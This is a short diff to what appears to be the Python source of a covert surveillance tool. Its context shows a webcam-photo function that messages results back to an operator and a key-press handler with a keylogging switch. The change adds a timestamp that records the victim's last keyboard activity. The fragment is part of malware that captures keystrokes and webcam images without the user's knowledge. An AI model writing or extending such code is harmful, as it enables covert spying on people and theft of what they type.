@@ -108,6 +108,10 @@ def takeWebcamPhoto():
 		sendMessage("Aucune webcam detectee")
 
 def on_key_press(event):
+
+	global last_activity
+	
+	last_activity = datetime.datetime.now()
 	
 	if keylogging:
 	
